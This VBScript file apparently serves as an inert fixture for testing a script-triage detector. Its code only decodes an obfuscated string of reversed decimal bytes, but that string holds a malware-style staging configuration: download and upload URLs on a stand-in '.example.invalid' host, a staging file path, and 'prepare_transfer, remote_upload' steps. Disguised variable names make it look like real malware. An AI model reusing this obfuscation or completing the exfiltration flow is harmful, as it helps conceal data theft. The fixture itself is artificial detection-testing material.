Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_83aeb0f3 = "51|98|56|99|56|56|48|97|47|100|97|111|108|112|117|47|100|105|108|97|118|110|105|46|101|108|112|109|97|120|101|46|100|54|56|54|102|49|53|100|51|100|47|47|58|115|112|116|116|104|61|108|114|117|95|100|97|111|108|112|117|124|116|97|100|46|100|54|56|54|102|49|53|100|51|100|45|101|103|97|116|115|92|98|97|76|115|115|101|114|116|110|117|72|92|99|105|108|98|117|80|92|115|114|101|115|85|92|58|67|61|104|116|97|112|95|101|108|105|102|124|100|54|56|54|102|49|53|100|51|100|47|98|97|76|115|115|101|114|116|110|117|72|61|116|110|101|103|97|95|114|101|115|117|124|116|97|100|46|102|53|97|56|102|57|56|57|47|100|105|108|97|118|110|105|46|101|108|112|109|97|120|101|46|100|54|56|54|102|49|53|100|51|100|47|47|58|115|112|116|116|104|61|108|114|117|124|100|54|56|54|102|49|53|100|51|100|45|110|103|105|97|112|109|97|99|61|100|105|95|110|103|105|97|112|109|97|99|124|50|61|116|110|117|111|99|95|101|103|97|116|115|124|48|46|54|46|80|84|84|72|76|77|88|114|101|118|114|101|83|46|50|76|77|88|83|77|61|114|101|116|112|97|100|97|124|101|116|111|109|101|114|95|100|97|111|108|112|117|44|114|101|102|115|110|97|114|116|95|101|114|97|112|101|114|112|44|108|97|99|111|108|95|101|116|97|99|111|108|61|115|112|101|116|115|124|49|61|118"
Const Codec_83aeb0f3 = "decimal_pipe|reverse_bytes|"

Function Load_83aeb0f3()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_83aeb0f3, "|")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_83aeb0f3 = result
End Function

Function Decode_83aeb0f3(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(UBound(SoUrCeByTeS) - ByTeInDeX) = SoUrCeByTeS(ByTeInDeX)
  Next
  Decode_83aeb0f3 = result
End Function

Function Recover_83aeb0f3()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  ' configuration reconstruction
NeUtRaL = LCase(UCase("Host"))
  SoUrCeByTeS = Load_83aeb0f3()
  For PaSs = 0 To 0
    DeCoDeDByTeS = Decode_83aeb0f3(SoUrCeByTeS)
  Next
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
' reconstruction complete
  Recover_83aeb0f3 = DeScRiPtOrTeXt
End Function

Function Inspect_83aeb0f3()
  Dim fields
  fields = Split(Recover_83aeb0f3(), "|")
  Inspect_83aeb0f3 = Join(fields, "|")
End Function
